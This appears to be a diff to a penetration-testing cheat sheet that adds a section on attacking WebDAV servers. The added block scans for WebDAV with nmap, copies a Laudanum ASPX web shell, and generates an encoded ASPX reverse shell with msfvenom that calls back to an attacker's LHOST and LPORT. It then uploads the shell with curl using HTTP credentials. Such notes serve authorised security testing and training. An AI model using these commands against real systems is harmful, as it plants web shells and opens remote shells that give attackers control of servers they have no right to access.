@@ -145,6 +145,27 @@ nuclei -u http://<TARGET_IP> -t exposures/configs/
 nuclei -l targets.txt -severity high,critical -o nuclei-results.txt
 ```
 
+## WebDAV Upload
+
+#Username #Password #HTTP #Enumeration #Exploitation
+If WebDAV is enabled and upload is allowed, generate or copy an ASPX shell and upload it with authenticated `curl`.
+
+```sh
+# Check for WebDAV support.
+nmap --script http-webdav-scan -p <PORT> <TARGET_IP>
+
+# Copy a known ASPX shell and edit LHOST/LPORT.
+locate shell.aspx
+cp /usr/share/laudanum/aspx/shell.aspx ./shell.aspx
+vi shell.aspx
+
+# Alternative: generate an ASPX reverse shell.
+msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -o shell.aspx
+
+# Upload the shell with valid HTTP/WebDAV credentials.
+curl -T shell.aspx 'http://<TARGET_IP>/<UPLOAD_PATH>' -u '<USER>:<PASS>'
+```
+
 ## Exposed Git Repository
 
 #HTTP #Enumeration #Looting
